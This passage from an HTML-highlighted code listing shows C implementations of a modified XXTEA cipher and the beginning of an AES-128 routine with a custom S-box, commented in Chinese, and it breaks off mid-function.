class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 1640531527</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z &gt;&gt; 5 ^ y &gt;&gt; 2) + (y &gt;&gt; 3 ^ z &gt;&gt; 4)) ^ ((sum ^ y) + (key[(p &amp; 3) ^ e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">btea</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">int</span> n, <span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">  <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line">  <span class="keyword">if</span> (n &gt; <span class="number">1</span>) <span class="comment">/* Coding Part */</span></span><br><span class="line">  &#123;</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> * n;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    z = v[n - <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      sum -= DELTA;</span><br><span class="line">      e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">for</span> (p = <span class="number">0</span>; p &lt; n - <span class="number">1</span>; p++)</span><br><span class="line">      &#123;</span><br><span class="line">        y = v[p + <span class="number">1</span>];</span><br><span class="line">        z = v[p] += MX;</span><br><span class="line">      &#125;</span><br><span class="line">      y = v[<span class="number">0</span>];</span><br><span class="line">      z = v[n - <span class="number">1</span>] += MX;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>) <span class="comment">/* Decoding Part */</span></span><br><span class="line">  &#123;</span><br><span class="line">    n = -n;</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> * n;</span><br><span class="line">    sum = rounds * (~DELTA + <span class="number">1</span>);</span><br><span class="line">    y = v[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">      <span class="keyword">for</span> (p = n - <span class="number">1</span>; p &gt; <span class="number">0</span>; p--)</span><br><span class="line">      &#123;</span><br><span class="line">        z = v[p - <span class="number">1</span>];</span><br><span class="line">        y = v[p] -= MX;</span><br><span class="line">      &#125;</span><br><span class="line">      z = v[n - <span class="number">1</span>];</span><br><span class="line">      y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">      sum += DELTA;</span><br><span class="line">    &#125; <span class="keyword">while</span> (--rounds);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint32_t</span> eK[<span class="number">44</span>], dK[<span class="number">44</span>]; <span class="comment">// encKey, decKey</span></span><br><span class="line">  <span class="type">int</span> Nr;                  <span class="comment">// 10 rounds</span></span><br><span class="line">&#125; AesKey;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLOCKSIZE 16 <span class="comment">// AES-128分组长度为16字节</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// uint8_t y[4] -&gt; uint32_t x</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOAD32H(x, y)                                                             \</span></span><br><span class="line"><span class="meta">  do                                                                              \</span></span><br><span class="line"><span class="meta">  &#123;                                                                               \</span></span><br><span class="line"><span class="meta">    (x) = ((uint32_t)((y)[0] &amp; 0xff) &lt;&lt; 24) | ((uint32_t)((y)[1] &amp; 0xff) &lt;&lt; 16) | \</span></span><br><span class="line"><span class="meta">          ((uint32_t)((y)[2] &amp; 0xff) &lt;&lt; 8) | ((uint32_t)((y)[3] &amp; 0xff));         \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// uint32_t x -&gt; uint8_t y[4]</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STORE32H(x, y)                      \</span></span><br><span class="line"><span class="meta">  do                                        \</span></span><br><span class="line"><span class="meta">  &#123;                                         \</span></span><br><span class="line"><span class="meta">    (y)[0] = (uint8_t)(((x) &gt;&gt; 24) &amp; 0xff); \</span></span><br><span class="line"><span class="meta">    (y)[1] = (uint8_t)(((x) &gt;&gt; 16) &amp; 0xff); \</span></span><br><span class="line"><span class="meta">    (y)[2] = (uint8_t)(((x) &gt;&gt; 8) &amp; 0xff);  \</span></span><br><span class="line"><span class="meta">    (y)[3] = (uint8_t)((x) &amp; 0xff);         \</span></span><br><span class="line"><span class="meta">  &#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从uint32_t x中提取从低位开始的第n个字节</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BYTE(x, n) (((x) &gt;&gt; (8 * (n))) &amp; 0xff)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 密钥扩展中的SubWord(RotWord(temp),字节替换然后循环左移1位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIX(x) (((S[BYTE(x, 2)] &lt;&lt; 24) &amp; 0xff000000) ^ ((S[BYTE(x, 1)] &lt;&lt; 16) &amp; 0xff0000) ^ \</span></span><br><span class="line"><span class="meta">                ((S[BYTE(x, 0)] &lt;&lt; 8) &amp; 0xff00) ^ (S[BYTE(x, 3)] &amp; 0xff))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// uint32_t x循环左移n位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROF32(x, n) (((x) <span class="string">&lt;&lt; (n)) | ((x) &gt;</span>&gt; (32 - (n))))</span></span><br><span class="line"><span class="comment">// uint32_t x循环右移n位</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROR32(x, n) (((x) &gt;&gt; (n)) | ((x) &lt;&lt; (32 - (n))))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// AES-128轮常量,无符号长整型</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">uint32_t</span> rcon[<span class="number">10</span>] = &#123;</span><br><span class="line">    <span class="number">0x01000000UL</span>, <span class="number">0x02000000UL</span>, <span class="number">0x04000000UL</span>, <span class="number">0x08000000UL</span>, <span class="number">0x10000000UL</span>,</span><br><span class="line">    <span class="number">0x20000000UL</span>, <span class="number">0x40000000UL</span>, <span class="number">0x80000000UL</span>, <span class="number">0x1B000000UL</span>, <span class="number">0x36000000UL</span>&#125;;</span><br><span class="line"><span class="comment">// S盒</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>] = &#123;<span class="number">32</span>, <span class="number">123</span>, <span class="number">24</span>, <span class="number">167</span>, <span class="number">66</span>, <span class="number">68</span>, <span class="number">215</span>, <span class="number">74</span>, <span class="number">205</span>, <span class="number">50</span>, <span class="number">209</span>, <span class="number">236</span>, <span class="number">243</span>, <span class="number">129</span>, <span class="number">165</span>, <span class="number">137</span>, <span class="number">14</span>, <span class="number">145</span>, <span class="number">75</span>, <span class="number">240</span>, <span class="number">233</span>, <span class="number">93</span>, <span class="number">141</span>, <span class="number">245</span>, <span class="number">70</span>, <span class="number">252</span>, <span class="number">49</span>, <span class="number">54</span>, <span class="number">182</span>, <span class="number">172</span>, <span class="number">155</span>, <span class="number">185</span>, <span class="number">38</span>, <span class="number">9</span>, <span class="number">230</span>, <span class="number">64</span>, <span class="number">212</span>, <span class="number">176</span>, <span class="number">81</span>, <span class="number">79</span>, <span class="number">156</span>, <span class="number">62</span>, <span class="number">231</span>, <span class="number">121</span>, <span class="number">48</span>, <span class="number">136</span>, <span class="number">177</span>, <span class="number">60</span>, <span class="number">122</span>, <span class="number">92</span>, <span class="number">211</span>, <span class="number">20</span>, <span class="number">90</span>, <span class="number">171</span>, <span class="number">86</span>, <span class="number">192</span>, <span class="number">4</span>, <span class="number">41</span>, <span class="number">208</span>, <span class="number">59</span>, <span class="number">31</span>, <span class="number">249</span>, <span class="number">163</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">138</span>, <span class="number">132</span>, <span class="number">22</span>, <span class="number">244</span>, <span class="number">26</span>, <span class="number">234</span>, <span class="number">100</span>, <span class="number">166</span>, <span class="number">214</span>, <span class="number">46</span>, <span class="number">190</span>, <span class="number">47</span>, <span class="number">23</span>, <span class="number">196</span>, <span class="number">224</span>, <span class="number">30</span>, <span class="number">2</span>, <span class="number">58</span>, <span class="number">34</span>, <span class="number">143</span>, <span class="number">159</span>, <span class="number">203</span>, <span class="number">168</span>, <span class="number">44</span>, <span class="number">103</span>, <span class="number">52</span>, <span class="number">37</span>, <span class="number">213</span>, <span class="number">255</span>, <span class="number">239</span>, <span class="number">246</span>, <span class="number">226</span>, <span class="number">170</span>, <span class="number">217</span>, <span class="number">114</span>, <span class="number">254</span>, <span class="number">206</span>, <span class="number">161</span>, <span class="number">120</span>, <span class="number">133</span>, <span class="number">150</span>, <span class="number">42</span>, <span class="number">119</span>, <span class="number">202</span>, <span class="number">193</span>, <span class="number">55</span>, <span class="number">116</span>, <span class="number">162</span>, <span class="number">94</span>, <span class="number">108</span>, <span class="number">253</span>, <span class="number">184</span>, <span class="number">77</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">179</span>, <span class="number">221</span>, <span class="number">207</span>, <span class="number">113</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">248</span>, <span class="number">25</span>, <span class="number">72</span>, <span class="number">227</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">61</span>, <span class="number">21</span>, <span class="number">174</span>, <span class="number">152</span>, <span class="number">229</span>, <span class="number">128</span>, <span class="number">189</span>, <span class="number">188</span>, <span class="number">130</span>, <span class="number">198</span>, <span class="number">148</span>, <span class="number">1</span>, <span class="number">228</span>, <span class="number">222</span>, <span class="number">6</span>, <span class="number">80</span>, <span class="number">149</span>, <span class="number">223</span>, <span class="number">71</span>, <span class="number">247</span>, <span class="number">144</span>, <span class="number">139</span>, <span class="number">69</span>, <span class="number">154</span>, <span class="number">110</span>, <span class="number">7</span>, <span class="number">173</span>, <span class="number">28</span>, <span class="number">53</span>, <span class="number">131</span>, <span class="number">104</span>, <span class="number">3</span>, <span class="number">111</span>, <span class="number">91</span>, <span class="number">183</span>, <span class="number">251</span>, <span class="number">29</span>, <span class="number">197</span>, <span class="number">16</span>, <span class="number">124</span>, <span class="number">216</span>, <span class="number">106</span>, <span class="number">204</span>, <span class="number">105</span>, <span class="number">142</span>, <span class="number">36</span>, <span class="number">76</span>, <span class="number">57</span>, <span class="number">180</span>, <span class="number">160</span>, <span class="number">11</span>, <span class="number">82</span>, <span class="number">232</span>, <span class="number">169</span>, <span class="number">178</span>, <span class="number">140</span>, <span class="number">10</span>, <span class="number">191</span>, <span class="number">40</span>, <span class="number">134</span>, <span class="number">109</span>, <span class="number">175</span>, <span class="number">218</span>, <span class="number">65</span>, <span class="number">250</span>, <span class="number">117</span>, <span class="number">181</span>, <span class="number">67</span>, <span class="number">195</span>, <span class="number">96</span>, <span class="number">98</span>, <span class="number">43</span>, <span class="number">85</span>, <span class="number">242</span>, <span class="number">158</span>, <span class="number">45</span>, <span class="number">18</span>, <span class="number">35</span>, <span class="number">13</span>, <span class="number">219</span>, <span class="number">107</span>, <span class="number">199</span>, <span class="number">56</span>, <span class="number">127</span>, <span class="number">95</span>, <span class="number">151</span>, <span class="number">8</span>, <span class="number">237</span>, <span class="number">225</span>, <span class="number">187</span>, <span class="number">238</span>, <span class="number">157</span>, <span class="number">210</span>, <span class="number">146</span>, <span class="number">73</span>, <span class="number">63</span>, <span class="number">220</span>, <span class="number">88</span>, <span class="number">135</span>, <span class="number">194</span>, <span class="number">186</span>, <span class="number">153</span>, <span class="number">201</span>, <span class="number">78</span>, <span class="number">241</span>, <span class="number">33</span>, <span class="number">235</span>, <span class="number">19</span>, <span class="number">101</span>, <span class="number">89</span>, <span class="number">118</span>, <span class="number">12</span>, <span class="number">200</span>, <span class="number">5</span>, <span class="number">164</span>, <span class="number">84</span>, <span class="number">147</span>, <span class="number">27</span>, <span class="number">102</span>, <span class="number">17</span>, <span class="number">39</span>, <span class="number">83</span>, <span class="number">126</span>, <span class="number">15</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逆S盒</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> inv_S[<span class="number">256</span>] = &#123;<span class="number">64</span>, <span class="number">143</span>, <span class="number">81</span>, <span class="number">163</span>, <span class="number">56</span>, <span class="number">245</span>, <span class="number">146</span>, <span class="number">157</span>, <span class="number">218</span>, <span class="number">33</span>, <span class="number">188</span>, <span class="number">182</span>, <span class="number">243</span>, <span class="number">210</span>, <span class="number">16</span>, <span class="number">255</span>, <span class="number">170</span>, <span class="number">251</span>, <span class="number">208</span>, <span class="number">239</span>, <span class="number">51</span>, <span class="number">133</span>, <span class="number">67</span>, <span class="number">77</span>, <span class="number">2</span>, <span class="number">127</span>, <span class="number">69</span>, <span class="number">249</span>, <span class="number">159</span>, <span class="number">168</span>, <span class="number">80</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">237</span>, <span class="number">83</span>, <span class="number">209</span>, <span class="number">177</span>, <span class="number">91</span>, <span class="number">32</span>, <span class="number">252</span>, <span class="number">190</span>, <span class="number">57</span>, <span class="number">106</span>, <span class="number">203</span>, <span class="number">88</span>, <span class="number">207</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">44</span>, <span class="number">26</span>, <span class="number">9</span>, <span class="number">131</span>, <span class="number">90</span>, <span class="number">160</span>, <span class="number">27</span>, <span class="number">110</span>, <span class="number">214</span>, <span class="number">179</span>, <span class="number">82</span>, <span class="number">59</span>, <span class="number">47</span>, <span class="number">132</span>, <span class="number">41</span>, <span class="number">227</span>, <span class="number">35</span>, <span class="number">195</span>, <span class="number">4</span>, <span class="number">199</span>, <span class="number">5</span>, <span class="number">154</span>, <span class="number">24</span>, <span class="number">150</span>, <span class="number">128</span>, <span class="number">226</span>, <span class="number">7</span>, <span class="number">18</span>, <span class="number">178</span>, <span class="number">117</span>, <span class="number">235</span>, <span class="number">39</span>, <span class="number">147</span>, <span class="number">38</span>, <span class="number">183</span>, <span class="number">253</span>, <span class="number">247</span>, <span class="number">204</span>, <span class="number">54</span>, <span class="number">63</span>, <span class="number">229</span>, <span class="number">241</span>, <span class="number">52</span>, <span class="number">165</span>, <span class="number">49</span>, <span class="number">21</span>, <span class="number">113</span>, <span class="number">216</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">202</span>, <span class="number">130</span>, <span class="number">71</span>, <span class="number">240</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">173</span>, <span class="number">212</span>, <span class="number">114</span>, <span class="number">192</span>, <span class="number">156</span>, <span class="number">164</span>, <span class="number">119</span>, <span class="number">123</span>, <span class="number">99</span>, <span class="number">124</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">242</span>, <span class="number">107</span>, <span class="number">103</span>, <span class="number">43</span>, <span class="number">48</span>, <span class="number">1</span>, <span class="number">171</span>, <span class="number">118</span>, <span class="number">254</span>, <span class="number">215</span>, <span class="number">137</span>, <span class="number">13</span>, <span class="number">140</span>, <span class="number">161</span>, <span class="number">66</span>, <span class="number">104</span>, <span class="number">191</span>, <span class="number">230</span>, <span class="number">45</span>, <span class="number">15</span>, <span class="number">65</span>, <span class="number">153</span>, <span class="number">187</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">84</span>, <span class="number">152</span>, <span class="number">17</span>, <span class="number">225</span>, <span class="number">248</span>, <span class="number">142</span>, <span class="number">148</span>, <span class="number">105</span>, <span class="number">217</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">155</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">223</span>, <span class="number">206</span>, <span class="number">85</span>, <span class="number">181</span>, <span class="number">102</span>, <span class="number">112</span>, <span class="number">62</span>, <span class="number">246</span>, <span class="number">14</span>, <span class="number">72</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">185</span>, <span class="number">97</span>, <span class="number">53</span>, <span class="number">29</span>, <span class="number">158</span>, <span class="number">134</span>, <span class="number">193</span>, <span class="number">37</span>, <span class="number">46</span>, <span class="number">186</span>, <span class="number">120</span>, <span class="number">180</span>, <span class="number">198</span>, <span class="number">28</span>, <span class="number">166</span>, <span class="number">116</span>, <span class="number">31</span>, <span class="number">232</span>, <span class="number">221</span>, <span class="number">139</span>, <span class="number">138</span>, <span class="number">75</span>, <span class="number">189</span>, <span class="number">55</span>, <span class="number">109</span>, <span class="number">231</span>, <span class="number">200</span>, <span class="number">78</span>, <span class="number">169</span>, <span class="number">141</span>, <span class="number">213</span>, <span class="number">244</span>, <span class="number">234</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">174</span>, <span class="number">8</span>, <span class="number">101</span>, <span class="number">122</span>, <span class="number">58</span>, <span class="number">10</span>, <span class="number">224</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">92</span>, <span class="number">73</span>, <span class="number">6</span>, <span class="number">172</span>, <span class="number">98</span>, <span class="number">194</span>, <span class="number">211</span>, <span class="number">228</span>, <span class="number">121</span>, <span class="number">145</span>, <span class="number">149</span>, <span class="number">79</span>, <span class="number">220</span>, <span class="number">96</span>, <span class="number">129</span>, <span class="number">144</span>, <span class="number">136</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">184</span>, <span class="number">20</span>, <span class="number">70</span>, <span class="number">238</span>, <span class="number">11</span>, <span class="number">219</span>, <span class="number">222</span>, <span class="number">94</span>, <span class="number">19</span>, <span class="number">236</span>, <span class="number">205</span>, <span class="number">12</span>, <span class="number">68</span>, <span class="number">23</span>, <span class="number">95</span>, <span class="number">151</span>, <span class="number">126</span>, <span class="number">61</span>, <span class="number">196</span>, <span class="number">167</span>, <span class="number">25</span>, <span class="number">115</span>, <span class="number">100</span>, <span class="number">93</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* copy in[16] to state[4][4] */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">loadStateArray</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint8_t</span> *in)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      state[j][i] = *in++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* copy state[4][4] to out[16] */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">storeStateArray</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>], <span class="type">uint8_t</span> *out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      *out++ = state[j][i];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 密钥扩展，只接受16字初始密钥</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">keyExpansion</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, AesKey *aesKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">NULL</span> == key || <span class="literal">NULL</span> == aesKey)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;keyExpansion param is NULL\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (keyLen != <span class="number">16</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;keyExpansion keyLen = %d, Not support.\n&quot;</span>, keyLen);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> *w = aesKey-&gt;eK; <span class="comment">// 加密密钥</span></span><br><span class="line">  <span class="type">uint32_t</span> *v = 